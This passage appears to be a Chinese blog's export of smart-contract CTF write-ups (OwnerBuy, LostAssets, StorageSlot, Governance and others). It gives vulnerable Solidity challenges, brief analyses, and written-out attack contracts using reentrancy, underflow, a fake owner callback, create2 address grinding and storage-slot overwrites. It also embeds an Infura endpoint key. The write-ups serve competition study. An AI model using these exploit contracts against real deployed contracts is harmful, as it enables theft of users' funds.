&#125;\n\n&#125;\n\nAnalyse没啥好分析的\nAttackstep1–Cow–1 ether\nstep2–cov–2 ether\nstep3–run account\nstep4–see–0 ether\nstep5–payforflag\nreeentrancyH4ck/**\n *Submitted for verification at Etherscan.io on 2019-09-07\n*/\n\n/**\n *Submitted for verification at Etherscan.io on 2019-05-31\n*/\n\npragma solidity ^0.4.25;\n\ncontract owned &#123;\n    address public owner;\n\n    constructor () public &#123;\n        owner = msg.sender;\n    &#125;\n\n    modifier onlyOwner &#123;\n        require(msg.sender == owner);\n        _;\n    &#125;\n\n    function transferOwnership(address newOwner) public onlyOwner &#123;\n        owner = newOwner;\n    &#125;\n&#125;\n\ncontract challenge is owned&#123;\n    string public name;\n    string public symbol;\n    uint8 public decimals = 18;\n    uint256 public totalSupply;\n\n    mapping (address => uint256) public balanceOf;\n    mapping (address => uint256) public sellTimes;\n    mapping (address => mapping (address => uint256)) public allowance;\n    mapping (address => bool) public winner;\n\n    event Transfer(address _from, address _to, uint256 _value);\n    event Burn(address _from, uint256 _value);\n    event Win(address _address,bool _win);\n\n\n    constructor (\n        uint256 initialSupply,\n        string tokenName,\n        string tokenSymbol\n    ) public &#123;\n        totalSupply = initialSupply * 10 ** uint256(decimals);  \n        balanceOf[msg.sender] = totalSupply;                \n        name = tokenName;                                   \n        symbol = tokenSymbol;                               \n    &#125;\n\n    function _transfer(address _from, address _to, uint _value) internal &#123;\n        require(_to != address(0x0));\n        require(_value > 0);\n        \n        uint256 oldFromBalance = balanceOf[_from];\n        uint256 oldToBalance = balanceOf[_to];\n        \n        uint256 newFromBalance =  balanceOf[_from] - _value;\n        uint256 newToBalance =  balanceOf[_to] + _value;\n        \n        require(oldFromBalance >= _value);\n        require(newToBalance > oldToBalance);\n        \n        balanceOf[_from] = newFromBalance;\n        balanceOf[_to] = newToBalance;\n        \n        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));\n        emit Transfer(_from, _to, _value);\n    &#125;\n\n    function transfer(address _to, uint256 _value) \n        public \n        returns (bool success) &#123;\n        _transfer(msg.sender, _to, _value); \n        return true;\n    &#125;\n\n    function transferFrom(address _from, address _to, uint256 _value) \n        public \n        returns (bool success) &#123;\n        require(_value &lt;= allowance[_from][msg.sender]);    \n        allowance[_from][msg.sender] -= _value;\n        _transfer(_from, _to, _value);\n        return true;\n    &#125;\n\n    function approve(address _spender, uint256 _value) \n        public\n        returns (bool success) &#123;\n        allowance[msg.sender][_spender] = _value;\n        return true;\n    &#125;\n    \n    function burn(uint256 _value) \n        public \n        returns (bool success) &#123;\n        require(balanceOf[msg.sender] >= _value);\n        balanceOf[msg.sender] -= _value;\n        totalSupply -= _value;          \n        emit Burn(msg.sender, _value);\n        return true;\n    &#125;\n    \n    function balanceOf(address _address) public view returns (uint256 balance) &#123;\n        return balanceOf[_address];\n    &#125;\n    \n    function buy() \n        payable \n        public \n        returns (bool success)&#123;\n        require(balanceOf[msg.sender]==0);\n        require(msg.value == 1 wei);\n        _transfer(address(this), msg.sender, 1);\n        sellTimes[msg.sender] = 1;\n        return true;\n    &#125;\n    \n    \n    function sell(uint256 _amount) \n        public \n        returns (bool success)&#123;\n        require(_amount >= 100);\n        require(sellTimes[msg.sender] > 0);\n        require(balanceOf[msg.sender] >= _amount);\n        require(address(this).balance >= _amount);\n        msg.sender.call.value(_amount)();\n        _transfer(msg.sender, address(this), _amount);\n        sellTimes[msg.sender] -= 1;\n        return true;\n    &#125;\n    \n    function winnerSubmit() \n        public \n        returns (bool success)&#123;\n        require(winner[msg.sender] == false);\n        require(sellTimes[msg.sender] > 100);\n        winner[msg.sender] = true;\n        emit Win(msg.sender,true);\n        return true;\n    &#125;\n    \n    function kill(address _address) \n        public \n        onlyOwner &#123;\n        selfdestruct(_address);\n    &#125;\n    \n    function eth_balance() \n        public view\n        returns (uint256 ethBalance)&#123;\n        return address(this).balance;\n    &#125;\n    \n&#125;，\n\nAnalyse和之前在第二届区块链安全攻防大赛中做的一道题目很相似，不在过多解释了\n链接：https://bcyng-w.github.io/post/The%202nd%20Trusted%20Chain   ——-OwnerBuy\n","slug":"Chain Flag","date":"2022-08-21T08:00:13.497Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"9588ceed135f9fd2fe04406d687effc0","title":"The 2nd Trusted Chain--Blockchain Attack and Defense Competition","content":"总共十道题，时间原因总共打了五道题（4，5，6，8，9），但是团队成员间的配合，实现了全解，后续其他题目的wp我日后更新上来\n\n\nOwnerBuyCodepragma solidity ^0.5.0;\nimport \"./contracts/ERC20.sol\";\nimport \"./contracts/IERC20.sol\";\nimport \"./contracts/ERC20Detailed.sol\";\n\n\ninterface Changing &#123;\n    function isOwner(address) external returns (bool);\n&#125;\n\ncontract Ownable &#123;\n    address public _owner;\n    address public _previousOwner;\n\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() internal &#123;\n        address msgSender = msg.sender;\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    &#125;\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() &#123;\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public onlyOwner &#123;\n        require(\n            newOwner != address(0),\n            \"Ownable: new owner is the zero address\"\n        );\n\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n\n    //Locks the contract for owner for the amount of time provided\n    function lock() public onlyOwner &#123;\n        _previousOwner = _owner;\n        _owner = address(0);\n        emit OwnershipTransferred(_owner, address(0));\n    &#125;\n\n    //Unlocks the contract for owner when _lockTime is exceeds\n    function unlock() external payable &#123;\n        require(msg.value >= 1 ether);\n        emit OwnershipTransferred(_owner, _previousOwner);\n        _owner = _previousOwner;\n    &#125;\n&#125;\n\n\n\ncontract OwnerBuy is Ownable, ERC20, ERC20Detailed &#123;\n    mapping(address => bool) public status;\n    mapping(address => uint256) public Times;\n    mapping(address => bool) internal whiteList;\n    uint256 MAXHOLD = 100;\n    event finished(bool);\n\n    constructor() public ERC20Detailed(\"DEMO\", \"DEMO\", 18) &#123;&#125;\n\n    function isWhite(address addr) public view returns (bool) &#123;\n        return whiteList[addr];\n    &#125;\n\n    function setWhite(address addr) external onlyOwner returns (bool) &#123;\n        whiteList[addr] = true;\n        return true;\n    &#125;\n\n    function unsetWhite(address addr) external onlyOwner returns (bool) &#123;\n        whiteList[addr] = false;\n        return true;\n    &#125;\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal &#123;\n        _balances[sender] = _balances[sender].sub(amount);\n        _balances[recipient] = _balances[recipient].add(amount);\n        if (!isWhite(recipient)) &#123;\n            require(_balances[recipient] &lt;= MAXHOLD, \"hold overflow\");\n        &#125;\n        emit Transfer(sender, recipient, amount);\n    &#125;\n\n    function changestatus(address _owner) public &#123;\n        Changing tmp = Changing(msg.sender);\n        if (!tmp.isOwner(_owner)) &#123;\n            status[msg.sender] = tmp.isOwner(_owner);\n        &#125;\n    &#125;\n\n    function changeOwner() public &#123;\n        require(tx.origin != msg.sender);\n        require(uint(msg.sender) &amp; 0xffff == 0xffff);\n        if (status[msg.sender] == true) &#123;\n            status[msg.sender] = false;\n            _owner = msg.sender;\n        &#125;\n    &#125;\n\n    function buy() public payable returns (bool success) &#123;\n        require(_owner == 0x220866B1A2219f40e72f5c628B65D54268cA3A9D);\n        require(tx.origin != msg.sender);\n        require(Times[msg.sender] == 0);\n        require(_balances[msg.sender] == 0);\n        require(msg.value == 1 wei);\n        _balances[msg.sender] = 100;\n        Times[msg.sender] = 1;\n        return true;\n    &#125;\n\n    function sell(uint256 _amount) public returns (bool success) &#123;\n        require(_amount >= 200);\n        require(uint(msg.sender) &amp; 0xffff == 0xffff);\n        require(Times[msg.sender] > 0);\n        require(_balances[msg.sender] >= _amount);\n        require(address(this).balance >= _amount);\n        msg.sender.call.gas(1000000)(\"\");\n        _transfer(msg.sender, address(this), _amount);\n        Times[msg.sender] -= 1;\n        return true;\n    &#125;\n\n    function finish() public onlyOwner returns (bool) &#123;\n        require(Times[msg.sender] >= 100);\n        Times[msg.sender] = 0;\n        msg.sender.transfer(address(this).balance);\n        emit finished(true);\n        return true;\n    &#125;\n\n&#125;\n\nAnalyseemit finished(true)即可获胜\n调用finish函数两个限制条件，onlyOwner以及require(Times[msg.sender] &gt;&#x3D; 100)，可以看到每一个限制条件都有对应的backdoor\n首先sell函数可以造成Times[msg.sender]的下溢处，但是，一个account只能进行一次buy，所以，只有一个账户是做不到下溢处的（call重入），于是想到了转账，有点薅羊毛的味道，在transfer到同一个contract，此处又有新的问题，非whitelist有maxhold限制。最大100，setwhitelist函数又有onlyOwner限制\n所以现在只剩下了一个待解决的限制条件就是onlyOwner，改变owner有两步，先changestatus再changeOwner\nchangestatus函数中对于msg.sender没有限制，所以tmp.isOwner可以先返回false再返回true，此时 status[attack contract]已经为true\n接下来进行changeOwner，第一个限制条件因为使用的合约攻击，自然就会绕过，第二个条件就是在考create2,跑一个合约地址就好了\nAttackcontract helper&#123;\n    address public owner;\n    constructor()public payable&#123;\n        owner=msg.sender;\n    &#125;\n    function attack1()public payable&#123;\n        OwnerBuy tar = OwnerBuy(0x146eF4c2e99F984c9aec6f1692bec21648101419);\n        tar.transfer(owner,100);\n        address payable target=(0x146eF4c2e99F984c9aec6f1692bec21648101419);\n        selfdestruct(target);\n    &#125;\n    function attack2()public payable&#123;\n        OwnerBuy tar = OwnerBuy(0x146eF4c2e99F984c9aec6f1692bec21648101419);\n        tar.buy.value(1 wei)();\n    &#125;\n&#125;\n\n\ncontract attack&#123;\n    OwnerBuy tar = OwnerBuy(0x146eF4c2e99F984c9aec6f1692bec21648101419);\n    bool public flag=false;\n    helper[3] public secondtar;\n\n    function isOwner(address)public returns (bool)&#123; \n       if(!flag)&#123;\n           flag=true;\n           return false;\n       &#125;\n       else&#123;\n           flag=false;\n           return true;\n       &#125;\n    &#125;\n\n    function step1()public payable&#123;\n        tar.changestatus(address(this));\n        tar.changeOwner();\n        tar.transferOwnership(0x220866B1A2219f40e72f5c628B65D54268cA3A9D);\n        tar.buy.value(1 wei)();\n        for(uint i=0;i&lt;3;i++)&#123;\n            secondtar[i]=new helper();\n            secondtar[i].attack2.value(133 wei)();\n        &#125;\n    &#125;\n    function step2()public&#123;\n        tar.changestatus(address(this));\n        tar.changeOwner();\n        tar.setWhite(address(this));\n        tar.setWhite(address(tar));\n        for(uint i=0;i&lt;3;i++)&#123;\n            secondtar[i].attack1();\n        &#125;\n    &#125;\n    function step3()public payable&#123;\n        // for(uint x=0;x&lt;2;x++)\n        &#123;tar.sell(200);&#125;\n    &#125;\n    \n    function step4()public&#123;\n        tar.finish();\n    &#125;\n    function() external payable&#123;\n        if(!flag)&#123;\n        tar.sell(200);\n        flag=true;\n        &#125;\n    &#125;\n&#125;\n\n\ncontract Deployer &#123;\n    address public a;\n    bytes code = hex\"攻击合约的bytecode\";\n    function deploy(uint salt) internal returns (address)&#123;\n        bytes memory bytecode = code;\n        address addr;\n      \n        assembly &#123;\n          addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)\n        &#125;\n\n        return addr;\n    &#125;\n    function get(uint salt)public &#123;\n        a=deploy(salt);\n    &#125;\n&#125;\n\n跑合约脚本\ndeployingAddr='deployer地址'\ncode='attack contract bytecode'\ns=Web3.keccak(hexstr=code)\na=''.join(['%02x' % b for b in s])\n\nfor i in range(0xffff,0xffffffffffffffff):\n    salt=hex(i)[2:].rjust(64,'0')\n    # print(salt)\n    p=Web3.keccak(hexstr=('0xff' + deployingAddr + salt + a))[12:].hex()\n    print(i,p,p[38:42]=='ffff')\n    if p[38:42]=='ffff':\n        print(salt,p)\n        break\n\n\n部署deployer\n部署攻击合约\nstep1\nstep2\nstep3\nstep4–solved\n\nLostAssetsCodepragma solidity 0.8.10;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport &#123;IERC20Permit, ERC20Permit&#125; from \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";\n\ncontract MockWETH is ERC20(\"Wrapped ETH\", \"WETH\") &#123;\n    event Deposit(address indexed dst, uint256 wad);\n    event Withdrawal(address indexed src, uint256 wad);\n    fallback() external payable &#123;\n        deposit();\n    &#125;\n\n    function deposit() public payable &#123;\n        _mint(msg.sender, msg.value);\n        emit Deposit(msg.sender, msg.value);\n    &#125;\n\n    function withdraw(uint256 wad) public &#123;\n        require(balanceOf(msg.sender) >= wad, \"weth: insufficient balance\");\n\n        _burn(msg.sender, wad);\n        (bool success, ) = msg.sender.call&#123;value: wad&#125;(\"\");\n        require(success, \"weth: failed\");\n\n        emit Withdrawal(msg.sender, wad);\n    &#125;\n&#125;\n\n/// @notice Token sWETH\ncontract MocksWETH is ERC20Permit &#123;\n    using SafeERC20 for IERC20;\n\n    address underlying;\n\n    constructor(address _underlying)\n        ERC20(\"WrappedERC20\", \"WERC20\")\n        ERC20Permit(\"WrappedERC20\")\n    &#123;\n        underlying = _underlying;\n    &#125;\n\n    function deposit() external returns (uint256) &#123;\n        uint256 _amount = IERC20(underlying).balanceOf(msg.sender);\n        IERC20(underlying).safeTransferFrom(msg.sender, address(this), _amount);\n        return _deposit(_amount, msg.sender);\n    &#125;\n\n    function deposit(uint256 amount) external returns (uint256) &#123;\n        IERC20(underlying).safeTransferFrom(msg.sender, address(this), amount);\n        return _deposit(amount, msg.sender);\n    &#125;\n\n    function depositWithPermit(\n        address target,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        address to\n    ) external returns (uint256) &#123;\n        // permit is an alternative to the standard approve call:\n        // it allows an off-chain secure signature to be used to register an allowance.\n        // The permitter is approving the beneficiary to spend their money, by signing the permit request\n        IERC20Permit(underlying).permit(\n            target,\n            address(this),\n            value,\n            deadline,\n            v,\n            r,\n            s\n        );\n        IERC20(underlying).safeTransferFrom(target, address(this), value);\n        return _deposit(value, to);\n    &#125;\n\n    function _deposit(uint256 value, address to) internal returns (uint256) &#123;\n        _mint(to, value);\n        return value;\n    &#125;\n\n    /// @notice withdraw all\n    function withdraw() external returns (uint256) &#123;\n        return _withdraw(msg.sender, balanceOf(msg.sender), msg.sender);\n    &#125;\n\n    /// @notice withdraw specified `amount`\n    function withdraw(uint256 amount) external returns (uint256) &#123;\n        return _withdraw(msg.sender, amount, msg.sender);\n    &#125;\n\n    function _withdraw(\n        address from,\n        uint256 amount,\n        address to\n    ) internal returns (uint256) &#123;\n        _burn(from, amount);\n        IERC20(underlying).safeTransfer(to, amount);\n        return amount;\n    &#125;\n&#125;\n\n\n\n\n\n\ncontract LostAssets &#123;\n    MockWETH public WETH;\n    MocksWETH public sWETH;\n\n    constructor() payable &#123;\n        require(msg.value >= 1 ether, \"At least 1 ether\");\n\n        WETH = new MockWETH();\n        sWETH = new MocksWETH(address(WETH));\n\n        WETH.deposit&#123;value: msg.value&#125;();\n        // Guaranteed interchangeability of WETH and sWETH\n        WETH.approve(address(sWETH), type(uint256).max);\n        // sWETH.approve(address(WETH), type(uint256).max); // WETH cannot use approval\n        // Deposit half of weth balance\n        sWETH.deposit(msg.value / 2);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        require(WETH.balanceOf(address(this)) == 0);\n        return true;\n    &#125;\n\n&#125;\n\nAnalyse要求，使LostAssets合约在WETH下的余额为0\nsWET合约下有函数depositWithPermit，也就是使用签名的方式进行授权，sWETH合约确实有初始化ERC20Permit合约，但是授权操作使针对WETH而言。\n实际上，WETH合约没有和ERC20Permit合约产生任何联系，所以函数中的 IERC20Permit(underlying)自然也就是一空合约\n所以在permit这一步操作中自然也就没有任何条件限制，虽然签名授权没有成功，但是在LostAssets合约部署时已经进行了授权最大值的WETH数量\n所以在此之后继续执行safeTransferFrom函数进行deposit，to地址为任意，然后即可清空LostAssets合约的WETH余额完成挑战\nAttack\nstep1–permission\nstep2–solve\n\nStorageSlotCodeimport \"./StorageSlot.sol\";\n\npragma solidity ^0.8.0;\ncontract Storage1 &#123;\n    uint256 public constant VERSION = 1;\n    address public aaaaa;\n    address public admin;\n\n    bytes32 public constant OPERATOR_ROLE = keccak256(\"OPERATOR_ROLE\");\n\n    // Gas deposits ledger for user\n\n    mapping(address => uint256) public gasDeposits;\n    event SendFlag();\n    event SetLogicContract(bytes32 key, address oldAddress, address newAddress);\n\n    event DepositedGas(address account, uint256 amount);\n\n    event WithdrewGas(address account, uint256 amount);\n\n    // error ZeroValue();\n\n    // error ZeroAmount();\n    // error NoAccess(bytes32 roleid, address account);\n\n    /// @dev Initializer to be used after creation, instead of constructor\n\n    constructor() &#123;\n        admin = address(0x123);\n    &#125;\n\n    function setLogicContract(bytes32 key, address contractAddress) external &#123;\n        // Load the slot\n\n        StorageSlot.AddressSlot storage slot = StorageSlot.getAddressSlot(key);\n\n        // Emit the change event\n\n        emit SetLogicContract(key, slot.value, contractAddress);\n\n        // Assign the new value to the slot\n\n        slot.value = contractAddress;\n    &#125;\n\n    function isComplete() public  &#123;\n        require(admin == msg.sender);\n        require(gasDeposits[msg.sender] >= 9999999999999999999999999999999999);\n        emit SendFlag();\n    &#125;\n\n    function depositGasFor(address account) external payable &#123;\n        depositGas(account, msg.value);\n    &#125;\n\n    function depositGas(address account, uint256 amount) internal &#123;\n        if (amount == 0) revert();\n        //  ZeroValue();\n\n        // The deposited ETH is added to the contract's balance\n\n        // update gasFeeDeposit\n\n        gasDeposits[account] = gasDeposits[account] + amount;\n\n        // emit event\n\n        emit DepositedGas(account, amount);\n    &#125;\n\n    /// @dev Lets user withdraw eth from the gas deposits\n\n    function withdrawGas(uint256 amount) external &#123;\n        if (amount == 0) revert();\n        //  ZeroAmount();\n\n        // If _amount is higher than deposit, withdraw all\n\n        uint256 withdrawAmount = amount > gasDeposits[msg.sender]\n            ? gasDeposits[msg.sender]\n            : amount;\n\n        // Quietly return if there is nothing to withdraw\n\n        if (withdrawAmount == 0) return;\n\n        // Adjust the balance\n\n        gasDeposits[msg.sender] = gasDeposits[msg.sender] - withdrawAmount;\n\n        // Send the ETH to msg.sender\n\n        payable(msg.sender).transfer(withdrawAmount);\n\n        // emit event\n\n        emit WithdrewGas(msg.sender, withdrawAmount);\n    &#125;\n\n    receive() external payable &#123;\n        depositGas(msg.sender, msg.value);\n    &#125;\n\n    modifier onlyAdmin() &#123;\n        require(admin == msg.sender);\n\n        _;\n    &#125;\n&#125;\n\ncontract attack&#123;\n    \n&#125;\n\nStorageSlot.sol\nlibrary StorageSlot &#123;\n    struct AddressSlot &#123;\n        address value;\n    &#125;\n\n    struct BooleanSlot &#123;\n        bool value;\n    &#125;\n\n    struct Bytes32Slot &#123;\n        bytes32 value;\n    &#125;\n\n    struct Uint256Slot &#123;\n        uint256 value;\n    &#125;\n\n    /**\n     * @dev Returns an `AddressSlot` with member `value` located at `slot`.\n     */\n    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;\n        /// @solidity memory-safe-assembly\n        assembly &#123;\n            r.slot := slot\n        &#125;\n    &#125;\n\n    /**\n     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.\n     */\n    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) &#123;\n        /// @solidity memory-safe-assembly\n        assembly &#123;\n            r.slot := slot\n        &#125;\n    &#125;\n\n    /**\n     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.\n     */\n    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) &#123;\n        /// @solidity memory-safe-assembly\n        assembly &#123;\n            r.slot := slot\n        &#125;\n    &#125;\n\n    /**\n     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.\n     */\n    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) &#123;\n        /// @solidity memory-safe-assembly\n        assembly &#123;\n            r.slot := slot\n        &#125;\n    &#125;\n&#125;\n\n\nAnalyse就是在考存储机制，变量覆盖\nmapping类型是keccak（slot+key）\nps：constant有独特的一套存储方式，和普通变量不同\nAttackcontract attack&#123;\n    Storage1 target=Storage1(payable(0xE2E42Cb218Edb672f35361738eae21827d22BA2e));\n    function GetOwner() public&#123;\n        target.setLogicContract(0x0000000000000000000000000000000000000000000000000000000000000001,address(this));\n    &#125;\n    function IncreaseBalance(bytes32 key)public&#123;\n        target.setLogicContract(key,0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF);\n    &#125;\n    function complete() public &#123;\n        target.isComplete();\n    &#125;\n&#125;\n\n计算gasDeposit存储地址：\nfrom web3 import Web3,HTTPProvider\nimport binascii\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/18a393d792ae461489aa663d5d1b3fdf'))\n\ndef byte32(i):\n    return binascii.unhexlify('%064x'%i)\nkey=0x169D04de13b91f03A59a0dA7a3660de096F5B662\nb=(byte32(key)+byte32(2)).hex()\nslot=Web3.keccak(hexstr=b).hex()\nprint(slot)\n\nprint(w3.eth.getStorageAt('0xE2E42Cb218Edb672f35361738eae21827d22BA2e',slot).hex())\n\nstep1–GetOwner\nstep2–calculate storageAddress\nstep3–IncreaseBalance（storageAddress）\nstep4–complete\nGovernanceCodegovernance\n// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.6.12;\n\nimport \"./interface.sol\";\nimport \"./Masterchef.sol\";\n\ncontract Governance &#123;\n    bool public Flag;\n    address public  ValidatorOwner;\n    mapping (address => uint256) public validatorVotes;\n    mapping (address => bool) public VotingStatus;\n    event Sendflag(bool Flag);\n    MasterChef public masterChef = new MasterChef();\n    string greeting;\n    constructor (string memory _greeting) public &#123;\n        greeting = _greeting;\n    &#125;\n    modifier onlyValidatorOwner() &#123;\n        require(msg.sender == ValidatorOwner, \"Governance: only validator owner\");\n        _;\n    &#125;\n    function vote(address validator) public &#123;\n        require(masterChef.owner() == msg.sender);\n        require(!VotingStatus[msg.sender]);\n        VotingStatus[msg.sender] = true;\n        uint balances = masterChef.balanceOf(msg.sender);\n        validatorVotes[validator] += balances;\n    &#125;\n    function setValidator() public &#123;\n        uint256 votingSupply = masterChef.totalSupply() * 2 / 3;\n        require(validatorVotes[msg.sender] >= votingSupply);\n        ValidatorOwner = msg.sender;\n    &#125;\n\n    function setflag() public onlyValidatorOwner &#123;\n        Flag = true;\n        emit Sendflag(Flag);\n    &#125;\n&#125;\n\nMasterchef\npragma solidity 0.6.12;\n\nimport \"./interface.sol\";\n\nabstract contract Context &#123;\n    function _msgSender() internal view virtual returns (address payable) &#123;\n        return msg.sender;\n    &#125;\n\n    function _msgData() internal view virtual returns (bytes memory) &#123;\n        this;\n        return msg.data;\n    &#125;\n&#125;\n\ncontract Ownable is Context &#123;\n    address public _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () internal &#123;\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    &#125;\n\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    modifier onlyOwner() &#123;\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n\n    function renounceOwnership() public virtual onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n    \n    function transferOwnership(address newOwner) public virtual onlyOwner &#123;\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\n\ncontract ERC20 is Context, IERC20 &#123;\n    using SafeMath for uint256;\n    using Address for address;\n\n    mapping (address => uint256) private _balances;\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor (string memory name, string memory symbol) public &#123;\n        _name = name;\n        _symbol = symbol;\n        _decimals = 1;\n    &#125;\n\n    function name() public view returns (string memory) &#123;\n        return _name;\n    &#125;\n\n    function symbol() public view returns (string memory) &#123;\n        return _symbol;\n    &#125;\n\n    function decimals() public view returns (uint8) &#123;\n        return _decimals;\n    &#125;\n\n    function totalSupply() public view override returns (uint256) &#123;\n        return _totalSupply;\n    &#125;\n\n    function balanceOf(address account) public view override returns (uint256) &#123;\n        return _balances[account];\n    &#125;\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) &#123;\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    &#125;\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;\n        return _allowances[owner][spender];\n    &#125;\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;\n        _approve(_msgSender(), spender, amount);\n        return true;\n    &#125;\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123;\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    &#125;\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    &#125;\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    &#125;\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual &#123;\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    &#125;\n\n    function _mint(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    &#125;\n\n    function _burn(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    &#125;\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    &#125;\n\n    function _setupDecimals(uint8 decimals_) internal &#123;\n        _decimals = decimals_;\n    &#125;\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual &#123; &#125;\n&#125;\n\ncontract MasterChef is Ownable, ERC20 &#123;\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n\n    struct UserInfo &#123;\n        uint256 amount;\n        uint256 rewardDebt; \n    &#125;\n\n    struct PoolInfo &#123;    \n        uint256 allocPoint;\n        uint256 lastRewardBlock; \n        uint256 accSushiPerShare; \n        uint256 totalstake;\n    &#125;\n\n    uint256 public sushiPerBlock;\n\n    PoolInfo[] public poolInfo;\n    mapping (uint256 => mapping (address => UserInfo)) public userInfo;\n    uint256 public totalAllocPoint = 0;\n    uint256 public startBlock;\n    uint256 public aridorplimit;\n    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);\n    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);\n    event EmergencyWithdraw(address indexed user, uint256 indexed pid, uint256 amount);\n\n    constructor(\n    ) ERC20(\"test\",\"test\") public &#123;\n        _mint(address(this),10000000);\n        _mint(msg.sender,100000000);\n        sushiPerBlock = 1;\n        startBlock = block.number;\n        uint256 lastRewardBlock = block.number > startBlock ? block.number : startBlock;\n        uint256 _allocPoint = 100;\n        totalAllocPoint = totalAllocPoint.add(_allocPoint);\n        poolInfo.push(PoolInfo(&#123;\n            allocPoint: _allocPoint,\n            lastRewardBlock: lastRewardBlock,\n            accSushiPerShare: 0,\n            totalstake: 0\n        &#125;));\n    &#125;\n    function transferOwnership(address newOwner) public override&#123;\n        require(balanceOf(msg.sender) >= 1000000, \"\");\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n    function airdorp() public &#123;\n        require(aridorplimit &lt; 1000,\"\");\n        _mint(msg.sender,1);\n        aridorplimit = aridorplimit + 1;\n    &#125;\n    function poolLength() external view returns (uint256) &#123;\n        return poolInfo.length;\n    &#125;\n    function getMultiplier(uint256 _from, uint256 _to) public view returns (uint256) &#123;\n        return _to.sub(_from);\n    &#125;\n\n    function 